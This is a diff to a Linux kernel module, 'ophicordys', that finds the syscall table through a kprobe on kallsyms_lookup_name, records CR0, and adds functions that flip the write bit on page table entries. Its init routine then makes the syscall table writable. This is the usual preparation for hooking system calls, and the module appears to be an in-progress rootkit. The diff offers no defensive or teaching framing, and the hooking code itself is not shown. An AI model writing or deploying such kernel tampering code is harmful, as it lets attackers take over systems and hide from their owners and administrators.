@@ -20,10 +20,12 @@ MODULE_LICENSE("GPL");
 
 int get_system(void);
 unsigned long* get_syscall_table(void);
-int set_memory_rw(unsigned long cr0);
-int set_memory_ro(unsigned long cr0);
+void set_page_rw(unsigned long address);
+void set_page_ro(unsigned long address);
 
 typedef unsigned long (*kln_func_t)(const char* name);
+
+unsigned long cr0;
 
 static struct kprobe probe = {
     .symbol_name = "kallsyms_lookup_name"
@@ -65,9 +67,19 @@ unsigned long* get_syscall_table(void) {
     return syscall_table;
 }
 
-int set_memory_rw(unsigned long cr0) { return 0; }
+void set_page_rw(unsigned long address) {
+    unsigned int level;
 
-int set_memory_ro(unsigned long cr0) { return 0; }
+    pte_t *pte = lookup_address(address, &level);
+    pte->pte |= _PAGE_RW;
+}
+
+void set_page_ro(unsigned long address) {
+    unsigned int level;
+
+    pte_t *pte = lookup_address(address, &level);
+    pte->pte &= ~_PAGE_RW;
+}
 
 static int __init ophicordys_init(void) {
     #ifdef DEBUG
@@ -84,11 +96,13 @@ static int __init ophicordys_init(void) {
     printk(KERN_INFO "%s: syscall table located at: %lx\n", THIS_MODULE->name, *syscall_table);
     #endif
 
-    unsigned long cr0 = read_cr0();
+    cr0 = read_cr0();
 
     #ifdef DEBUG
     printk(KERN_INFO "%s: identified cr0: %lx\n", THIS_MODULE->name, cr0);
     #endif
+
+    set_page_rw((unsigned long) syscall_table);
 
     return 0;
 }
